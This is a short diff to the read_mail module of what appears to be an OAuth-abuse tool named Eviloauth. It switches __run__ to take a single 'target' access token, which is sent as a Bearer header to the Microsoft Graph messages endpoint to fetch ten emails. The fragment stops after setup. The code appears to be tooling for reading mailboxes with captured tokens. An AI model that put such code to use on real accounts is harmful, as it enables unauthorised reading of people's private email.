@@ -46,23 +46,17 @@ def __load__():
     pass
 
 
-def __run__(access_tokens, i):
+def __run__(target_access_token, i):
     print('RUNNING read_mail')
 
-    try:
-        access_token_id, access_token = next(iter(access_tokens.items()))
-    except StopIteration:
-        raise EviloauthModuleException(
-            'No access tokens found.')
-
-    if access_token_id:
-        print(f'Using ID "{access_token_id}"')
+    if target_access_token:
+        print(f'Using ID "{target_access_token}"')
 
         email_count = 10
 
         graph_url = 'https://graph.microsoft.com/v1.0/me/messages'
         graph_headers = {
-            'Authorization': f'Bearer {access_token.raw_token}'
+            'Authorization': f'Bearer {target_access_token.raw_token}'
         }
 
         emails = []
